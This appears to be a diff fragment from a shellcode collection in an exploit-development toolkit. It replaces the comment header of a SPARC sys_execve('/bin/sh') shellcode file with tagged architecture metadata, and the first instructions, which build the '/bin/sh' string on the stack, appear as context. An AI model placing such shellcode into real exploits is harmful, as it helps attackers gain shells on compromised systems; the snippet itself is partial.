@@ -1,8 +1,11 @@
-#
-# SPARC sys_execve("/bin/sh") shellcode
-#
-# @_hugsy_
-#
+;;; @@@ arch:sparc @@@
+;;; @@@ endian:little @@@
+;;; @@@ syntax:intel @@@
+;;;
+;;; SPARC sys_execve("/bin/sh") shellcode
+;;;
+;;; @_hugsy_
+;;;
 mov  0x6e69622f, %g1
 st %g1, [ %sp ]
 mov  0x0068732f, %g1
